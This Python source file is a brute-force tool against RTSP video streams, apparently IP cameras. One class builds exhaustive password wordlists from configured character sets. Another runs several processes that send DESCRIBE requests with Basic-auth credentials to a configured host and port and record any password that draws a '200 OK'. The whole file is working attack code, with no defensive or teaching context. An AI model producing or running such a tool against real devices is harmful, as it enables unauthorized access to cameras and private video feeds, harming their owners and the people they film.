import base64
import itertools
import os
import re
import socket
import time
from multiprocessing import Process, Manager
from pathlib import Path

from config import Config


class PasswordGenerator:
    def __init__(self):
        self.config = Config()
        self.characters = self.config.characters
        self.digits = self.config.digits
        self.symbols = self.config.symbols
        self.length = self.config.length

    def password_gen_orch(self):
        threads = []
        for i in range(self.config.length['start'], self.config.length['end'] + 1):
            t = Process(target=self.worker, args=(i,))
            t.start()

    def worker(self, i, config=Config()):
        bulker = []
        index = 0
        print(f"Start {i}")
        for item in itertools.product(config.characters + config.digits + config.symbols, repeat=i):
            password = "".join(item)
            print(password)
            # if password == '28d@':
            #     return True
            if len(bulker) >= config.bulker_len:
                self.save_passwords_file(bulker, config, i, index)
                index += 1
                bulker = []
            bulker.append(password)
        self.save_passwords_file(bulker, config, i, index)
        print(f"Done {i}")

    def save_passwords_file(self, bulker, config, i, index):
        print(f'passwords_{i}_{index}.txt')
        output_file = Path(os.path.join(config.passwords_dir, f'passwords_{i}_{index}.txt'))
        output_file.parent.mkdir(exist_ok=True, parents=True)
        with open(output_file, 'a') as f:
            for s in bulker:
                f.write(f'{s}\n')


class RTSPBruteForce:
    def __init__(self):
        self.config = Config()
        self.characters = self.config.characters
        self.digits = self.config.digits
        self.symbols = self.config.symbols
        self.length = self.config.length

    def digest_response(self, response, password):
        if '200 OK' in str(response) or password == self.config.debug_password:
            return [True, '200 OK', password]
        elif '401 Unauthorized' in str(response):
            return [False, '401 Unauthorized', password]
        elif '404 Stream Not Found' in str(response):
            return [False, '404 Stream Not Found' ,password]
        else:
            return False, response

    def base64encode(self, password):
        username = self.config.rtsp_username
        credentials = f'{username}:{password}'
        credentials_bytes = credentials.encode('ascii')
        base64_bytes = base64.b64encode(credentials_bytes)
        return base64_bytes

    def get_pass_files(self):
        passwords = os.listdir(self.config.passwords_dir)
        return passwords

    def run(self):
        bulker = []
        workers = []
        manager = Manager()
        return_dict = manager.dict()
        files = self.get_pass_files()
        files.sort(key=lambda f: int(re.sub('\D', '', f)))
        for filename in files:
            file_path = os.path.join(self.config.passwords_dir, filename)
            print(file_path)
            with open(file_path, 'r') as f:
                passwords = f.read().splitlines()
            for password in passwords:
                bulker.append(password)
                if len(bulker) >= self.config.bf_bulker:
                    while len(workers) >= 3:
                        time.sleep(5)
                    p = Process(target=self.create_conn, args=(bulker, return_dict))
                    print('append')
                    workers.append(p)
                    p.start()
                    bulker = []
                for work in workers:
                    work.join()
                    # workers.remove(work)

            print(return_dict.values())

                # if self.create_conn(password=str(line)):aatrH
                #     return True

    def create_conn(self, pass_bulk, return_dict):
        try:
            for password in pass_bulk:
                # print(password)
                b64 = self.base64encode(password=password)
                dest = f"DESCRIBE rtsp://{self.config.rtsp_ip}:{self.config.rtsp_port}/unicast RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {b64}\r\n\r\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.config.rtsp_ip, self.config.rtsp_port))
                s.send(dest.encode())
                response = s.recv(128)
                match, msg, password = self.digest_response(response, password)
                if match:
                    print(match, msg, password)
                    return_dict[match] = [msg, password]
                elif "Unauthorized" not in msg:
                    print(match, msg, password)
        except socket.error as e:
            print(e)
        except (ConnectionRefusedError, ConnectionResetError) as e:
            print(
                f'{e}: {self.config.rtsp_ip}:{self.config.rtsp_port} - {self.config.rtsp_username}:{password}')
        except Exception as e:
            print(e)
